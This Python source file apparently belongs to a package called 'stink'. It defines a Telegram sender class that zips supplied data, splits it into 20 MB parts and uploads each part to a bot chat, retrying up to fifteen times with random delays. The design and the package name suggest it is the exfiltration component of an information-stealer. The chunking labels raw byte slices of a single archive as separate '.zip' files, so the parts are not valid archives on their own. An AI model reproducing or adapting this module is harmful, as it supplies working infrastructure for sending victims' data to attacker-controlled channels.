import logging
import time
import random
import os
from io import BytesIO
from typing import Tuple, List
import zipfile
import requests
from requests.exceptions import HTTPError, RequestException

from stink.abstract import AbstractSender

# Настройка логирования
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)


class Telegram(AbstractSender):
    def __init__(self, token: str, user_id: int, max_attempts: int = 15):
        super().__init__()
        self.__token = token
        self.__user_id = user_id
        self.__url = f"https://api.telegram.org/bot{self.__token}/sendDocument"
        self.__max_attempts = max_attempts
        self.chunk_size = 20 * 1024 * 1024  # 20 MB

    def __get_sender_data(self, file_name: str, file_data: BytesIO, caption: str) -> Tuple[dict, dict]:
        if isinstance(file_data, BytesIO):
            file_data.seek(0)

        files = {
            'document': (file_name, file_data, 'application/zip')
        }
        data = {
            'chat_id': self.__user_id,
            'caption': caption
        }
        return data, files

    def __send_file(self, file_name: str, file_data: BytesIO, caption: str) -> None:
        data, files = self.__get_sender_data(file_name, file_data, caption)
        headers = {
            'User-Agent': self._config.UserAgent
        }

        response = requests.post(self.__url, data=data, files=files, headers=headers)
        response.raise_for_status()

    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        # Архивируем и разделяем на части
        parts = self.__split_zip_into_parts(zip_name, data)

        # Отправляем части по отдельности
        for index, part in enumerate(parts):
            part_name = f"{zip_name}_part{index + 1}.zip"
            attempt = 0
            while attempt < self.__max_attempts:
                try:
                    attempt += 1
                    logging.info(f"[Telegram sender]: Попытка отправки {part_name} #{attempt}")
                    self.__send_file(part_name, part, f"{preview} (Part {index + 1})")
                    logging.info(f"[Telegram sender]: Отправка {part_name} успешна.")
                    break
                except HTTPError as e:
                    logging.error(f"[Telegram sender]: HTTPError {e.response.status_code}: {e.response.reason}")
                except RequestException as e:
                    logging.error(f"[Telegram sender]: RequestException: {str(e)}")
                except Exception as e:
                    logging.error(f"[Telegram sender]: Неизвестная ошибка: {repr(e)}")

                if attempt < self.__max_attempts:
                    delay = random.randint(1, 10)
                    logging.info(f"[Telegram sender]: Ожидание {delay} секунд перед повторной попыткой...")
                    time.sleep(delay)
                else:
                    logging.error(f"[Telegram sender]: Превышено максимальное количество попыток отправки {part_name}.")
                    return

    def __split_zip_into_parts(self, zip_name: str, data: BytesIO) -> List[BytesIO]:
        """
        Архивирует данные и разделяет их на части не более 20 МБ.

        Parameters:
        - zip_name (str): Имя архива.
        - data (BytesIO): Данные для архивации.

        Returns:
        - List[BytesIO]: Список частей архива в виде BytesIO объектов.
        """
        # Архивируем данные в zip
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr(f"{zip_name}.txt", data.getvalue())

        zip_buffer.seek(0)

        parts = []
        while True:
            chunk = zip_buffer.read(self.chunk_size)
            if not chunk:
                break
            part_buffer = BytesIO(chunk)
            parts.append(part_buffer)

        return parts

    def __generate_test_file(self) -> BytesIO:
        size = 1 * 1024 * 1024  # 1 MB
        random_data = ''.join(str(random.randint(0, 9)) for _ in range(size))
        test_file = BytesIO(random_data.encode('utf-8'))
        return test_file
